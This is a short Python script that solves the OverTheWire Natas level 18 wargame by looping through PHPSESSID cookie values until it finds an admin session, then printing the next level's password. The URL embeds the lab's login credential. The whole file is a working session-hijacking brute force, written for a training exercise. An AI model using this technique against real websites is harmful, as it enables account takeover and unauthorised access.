import requests

url = "http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org"

max_id = 640

for session_id in range(0, max_id):
	print(f"Trying session id {session_id}")
	r = requests.get(url, cookies={"PHPSESSID": str(session_id)})

	if "regular user" not in r.text:
		print("Found valid session id !")
		password = r.text.split('Password: ')[1].split("</pre>")[0]
		print(f"Natas19 password is {password}")
		break